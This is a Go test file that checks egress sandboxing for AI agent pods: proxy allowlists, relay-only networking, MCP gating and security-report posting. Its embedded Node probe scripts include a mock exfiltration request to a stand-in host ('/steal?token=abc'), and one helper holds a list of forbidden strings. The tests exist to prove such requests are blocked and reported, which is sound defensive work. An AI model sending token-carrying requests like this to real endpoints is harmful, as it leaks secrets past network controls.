package nodev1

import (
	"context"
	"encoding/json"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"testing"

	"projectmesh.io/mesh-cli/internal/meshapi"
)

// egressProbe is run in a pod's agent before its session: through
// $HTTPS_PROXY it asks for a package registry the kind does not name,
// then for a host it does, over TLS with the host's server name, and
// writes what each answered to argv[2].
const egressProbe = `"use strict";
const http = require("http"), tls = require("tls"), fs = require("fs");
const u = new URL(process.env.HTTPS_PROXY);
function get(host, cb) {
  const r = http.request({ host: u.hostname, port: u.port, method: "CONNECT", path: host + ":443" });
  r.on("connect", (res, sock) => {
    if (res.statusCode !== 200) { cb(host + " " + res.statusCode); return; }
    const t = tls.connect({ socket: sock, servername: host, rejectUnauthorized: false }, () => {
      t.write("GET / HTTP/1.1\r\nHost: " + host + "\r\nConnection: close\r\n\r\n");
    });
    let d = "";
    t.on("data", (c) => (d += c));
    t.on("end", () => cb(host + " " + (d.includes("reached " + host) ? "reached" : d)));
    t.on("error", (e) => cb(host + " " + e.message));
  });
  r.on("error", (e) => cb(host + " " + e.message));
  r.end();
}
get("registry.npmjs.org", (a) => get("proxy.golang.org", (b) => fs.writeFileSync(process.argv[2], a + "\n" + b + "\n")));
`

// A pod whose kind declares its egress has no way out but its relay: its
// network is relay-only (no port out, no DNS), its agent's HTTPS_PROXY
// names the relay through the pod's bridge, and through it a package
// registry the kind does not name is refused while a host it names is
// reached.
func TestAPodWithEgressReachesOnlyItsHostsThroughTheRelay(t *testing.T) {
	g, sb, _ := podRig(t)
	host := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		io.WriteString(w, "reached "+r.Host)
	}))
	defer host.Close()
	g.rt.EgressDial = func(ctx context.Context, network, _ string) (net.Conn, error) {
		return (&net.Dialer{}).DialContext(ctx, network, host.Listener.Addr().String())
	}
	dir := t.TempDir()
	probe, answers := filepath.Join(dir, "probe.js"), filepath.Join(dir, "answers")
	os.WriteFile(probe, []byte(egressProbe), 0o600)
	out := filepath.Join(dir, "claude")
	sb.Agent = hostAgent(t, out, `node "`+probe+`" "`+answers+`"`)
	g.offer(t, func(b *meshapi.Brief) {
		b.FinishTool, b.FinishSchema = "", nil
		b.Egress = &meshapi.Egress{Hosts: []string{"proxy.golang.org"}, MCP: []string{"conform"}, Model: true}
	})
	run(t, g, context.Background())
	if n := len(g.fake.Calls("finish")); n != 1 {
		t.Fatalf("%d finishes; hand-backs %+v", n, g.fake.Calls("hand-back"))
	}
	specs := sb.PodSpecs()
	if len(specs) != 1 || len(specs[0].Network.Ports) != 0 || !specs[0].Network.NoDNS {
		t.Fatalf("the pod's network is not relay-only: %+v", specs)
	}
	a := sb.AgentSpecs()[0]
	base := "http://127.0.0.1:" + strconv.Itoa(g.rt.gitBridgePort)
	if envValue(a.Env, "HTTPS_PROXY") != base || envValue(a.Env, "NO_PROXY") == "" || a.Command[0] != "node" {
		t.Fatalf("the agent's proxy %q (want %q), command %q", envValue(a.Env, "HTTPS_PROXY"), base, a.Command)
	}
	got, _ := os.ReadFile(answers)
	if want := "registry.npmjs.org 403\nproxy.golang.org reached\n"; string(got) != want {
		t.Fatalf("through the relay the pod got %q, want %q", got, want)
	}
}

// Without egress a pod keeps the node's network and no proxy.
func TestAPodWithoutEgressKeepsItsNetwork(t *testing.T) {
	g, sb, _ := podRig(t)
	g.rt.Pods.Config.Network.Ports = []int{443, 80}
	sb.Agent = hostAgent(t, filepath.Join(t.TempDir(), "claude"), "")
	g.offer(t, func(b *meshapi.Brief) { b.FinishTool, b.FinishSchema = "", nil })
	run(t, g, context.Background())
	specs := sb.PodSpecs()
	if len(specs) != 1 || len(specs[0].Network.Ports) != 2 || specs[0].Network.NoDNS {
		t.Fatalf("pods %+v", specs)
	}
	if v := envValue(sb.AgentSpecs()[0].Env, "HTTPS_PROXY"); v != "" {
		t.Fatalf("a pod without egress has HTTPS_PROXY %q", v)
	}
}

// An egress that names no MCP of the product, with an access that names
// none either, serves none of its servers; one that names it serves them.
func TestEgressMCPGatesTheProductsServers(t *testing.T) {
	for _, tc := range []struct {
		mcp  []string
		want bool
	}{{nil, false}, {[]string{"conform"}, true}} {
		sess := &slotSession{}
		g := newRig(t, sess)
		g.offer(t, func(b *meshapi.Brief) {
			b.Egress = &meshapi.Egress{Hosts: []string{}, MCP: tc.mcp}
			b.Access.MCP = nil
		})
		run(t, g, context.Background())
		if _, served := sess.listed["conform"]; served != tc.want {
			t.Fatalf("egress mcp %v: conform served %v, want %v (%v)", tc.mcp, served, tc.want, strings.Join(keys(sess.listed), ","))
		}
	}
}

func keys[V any](m map[string]V) []string {
	var out []string
	for k := range m {
		out = append(out, k)
	}
	return out
}

// plainProbe asks the relay, as a plain-HTTP proxy, for a URL with a
// path and a query, and writes the status it got to argv[2].
const plainProbe = `"use strict";
const http = require("http"), fs = require("fs");
const u = new URL(process.env.HTTP_PROXY);
const r = http.request({ host: u.hostname, port: u.port, method: "GET", path: "http://plain.example/steal?token=abc", headers: { Host: "plain.example" } }, (res) => {
  fs.writeFileSync(process.argv[2], String(res.statusCode));
  res.resume();
});
r.on("error", (e) => fs.writeFileSync(process.argv[2], e.message));
r.end();
`

// securityReports are the reports the node posted for lease, in order,
// each post's body checked for what must never be in it.
func securityReports(t *testing.T, g *rig, lease string) []meshapi.SecurityReport {
	t.Helper()
	var out []meshapi.SecurityReport
	for _, c := range g.fake.Calls("security") {
		if c.LeaseID != lease {
			t.Fatalf("a report for lease %s", c.LeaseID)
		}
		if !strings.HasPrefix(c.Auth, "Bearer ") {
			t.Fatalf("the reports went without the machine token: %q", c.Auth)
		}
		for _, never := range []string{"steal", "token=", "/steal", "http://", "https://"} {
			if strings.Contains(string(c.Body), never) {
				t.Fatalf("a report carries %q: %s", never, c.Body)
			}
		}
		var req meshapi.SecurityRequest
		if err := json.Unmarshal(c.Body, &req); err != nil {
			t.Fatal(err)
		}
		if len(req.Reports) == 0 || len(req.Reports) > meshapi.MaxSecurityReports {
			t.Fatalf("a post of %d reports", len(req.Reports))
		}
		out = append(out, req.Reports...)
	}
	return out
}

// reported finds the egress report of host with verdict.
func reported(reps []meshapi.SecurityReport, host, verdict string) *meshapi.SecurityReport {
	for i, r := range reps {
		if r.Type == meshapi.ReportEgress && r.Host == host && r.Verdict == verdict {
			return &reps[i]
		}
	}
	return nil
}

// assertEgressReported holds a lease's security reports to what its
// probes did: the registry the kind does not name refused, the host it
// names allowed with the bytes its tunnel carried, the plain-HTTP
// request refused by plainRule — each by host and rule alone.
func assertEgressReported(t *testing.T, g *rig, lease, plainRule string) {
	t.Helper()
	reps := securityReports(t, g, lease)
	deny := reported(reps, "registry.npmjs.org", meshapi.VerdictDeny)
	allow := reported(reps, "proxy.golang.org", meshapi.VerdictAllow)
	plain := reported(reps, "plain.example", meshapi.VerdictDeny)
	if deny == nil || deny.Rule != "egress.hosts" || allow == nil || allow.Rule != "egress.hosts" || allow.Bytes <= 0 || plain == nil || plain.Rule != plainRule {
		t.Fatalf("the reports %+v", reps)
	}
	for _, r := range reps {
		if r.At == nil {
			t.Fatalf("a report names no time: %+v", r)
		}
	}
}

// What the in-process relay's tunnel saw reaches Mesh after the lease
// released, content-free: an allowed host with its bytes, a refused one,
// and a plain-HTTP request by its host alone (mesh-specs gap 23).
func TestTheInProcessRelayReportsItsEgress(t *testing.T) {
	g, sb, _ := podRig(t)
	host := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		io.WriteString(w, "reached "+r.Host)
	}))
	defer host.Close()
	g.rt.EgressDial = func(ctx context.Context, network, _ string) (net.Conn, error) {
		return (&net.Dialer{}).DialContext(ctx, network, host.Listener.Addr().String())
	}
	dir := t.TempDir()
	probe, answers := filepath.Join(dir, "probe.js"), filepath.Join(dir, "answers")
	plain, plainAnswer := filepath.Join(dir, "plain.js"), filepath.Join(dir, "plain")
	os.WriteFile(probe, []byte(egressProbe), 0o600)
	os.WriteFile(plain, []byte(plainProbe), 0o600)
	sb.Agent = hostAgent(t, filepath.Join(dir, "claude"), `node "`+probe+`" "`+answers+`"; node "`+plain+`" "`+plainAnswer+`"`)
	job := g.offer(t, func(b *meshapi.Brief) {
		b.FinishTool, b.FinishSchema = "", nil
		b.Egress = &meshapi.Egress{Hosts: []string{"proxy.golang.org"}, MCP: []string{"conform"}, Model: true}
	})
	run(t, g, context.Background())
	if got, _ := os.ReadFile(plainAnswer); string(got) != "403" {
		t.Fatalf("the plain-HTTP request got %q", got)
	}
	assertEgressReported(t, g, g.fake.LeaseOf(job), "egress.https")
	if n := len(g.fake.Calls("finish")); n != 1 {
		t.Fatalf("%d finishes", n)
	}
}

// With a relay sidecar the same reports reach Mesh: what the node's
// tunnel saw, and what the sidecar refused itself, passed to the node
// over the lease's socket and posted by the node, the sidecar holding no
// machine token.
func TestARelaySidecarsEgressIsReportedByTheNode(t *testing.T) {
	g, sb, installed := sidecarRig(t)
	host := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		io.WriteString(w, "reached "+r.Host)
	}))
	defer host.Close()
	g.rt.EgressDial = func(ctx context.Context, network, _ string) (net.Conn, error) {
		return (&net.Dialer{}).DialContext(ctx, network, host.Listener.Addr().String())
	}
	dir := t.TempDir()
	probe, answers := filepath.Join(dir, "probe.js"), filepath.Join(dir, "answers")
	plain, plainAnswer := filepath.Join(dir, "plain.js"), filepath.Join(dir, "plain")
	os.WriteFile(probe, []byte(egressProbe), 0o600)
	os.WriteFile(plain, []byte(plainProbe), 0o600)
	sb.Agent = hostAgent(t, filepath.Join(dir, "claude"), `node "`+probe+`" "`+answers+`"; node "`+plain+`" "`+plainAnswer+`"`)
	job := g.offer(t, func(b *meshapi.Brief) {
		b.FinishTool, b.FinishSchema = "", nil
		b.Egress = &meshapi.Egress{Hosts: []string{"proxy.golang.org"}, MCP: []string{"conform"}, Model: true}
	})
	run(t, g, context.Background())
	if got, _ := os.ReadFile(plainAnswer); string(got) != "403" {
		t.Fatalf("the plain-HTTP request got %q", got)
	}
	assertEgressReported(t, g, g.fake.LeaseOf(job), "egress.none")
	machine, _ := g.rt.API.Token(context.Background())
	if len(*installed) != 1 || machine == "" || strings.Contains(string((*installed)[0]), machine) {
		t.Fatal("the sidecar was handed the machine token")
	}
}

// A report Mesh refuses (422) is dropped; one it could not take (5xx)
// is sent again, and the lease still ends as it would.
func TestSecurityReportsAreRetriedOn5xxAndDroppedOn422(t *testing.T) {
	for _, tc := range []struct {
		statuses []int
		taken    bool
	}{
		{[]int{http.StatusUnprocessableEntity}, false},
		{[]int{http.StatusServiceUnavailable, http.StatusBadGateway}, true},
	} {
		g, sb, _ := podRig(t)
		var n int
		var took bool
		g.fake.Security = func(_ string, reps []meshapi.SecurityReport) int {
			if n < len(tc.statuses) {
				n++
				return tc.statuses[n-1]
			}
			took = true
			return http.StatusAccepted
		}
		dir := t.TempDir()
		plain, plainAnswer := filepath.Join(dir, "plain.js"), filepath.Join(dir, "plain")
		os.WriteFile(plain, []byte(plainProbe), 0o600)
		sb.Agent = hostAgent(t, filepath.Join(dir, "claude"), `node "`+plain+`" "`+plainAnswer+`"`)
		g.offer(t, func(b *meshapi.Brief) {
			b.FinishTool, b.FinishSchema = "", nil
			b.Egress = &meshapi.Egress{Hosts: []string{}, MCP: []string{"conform"}}
		})
		run(t, g, context.Background())
		if want := len(tc.statuses) + map[bool]int{true: 1}[tc.taken]; len(g.fake.Calls("security")) != want || took != tc.taken {
			t.Fatalf("statuses %v: %d posts (want %d), taken %v", tc.statuses, len(g.fake.Calls("security")), want, took)
		}
		if len(g.fake.Calls("finish")) != 1 {
			t.Fatalf("statuses %v: the lease did not finish", tc.statuses)
		}
	}
}
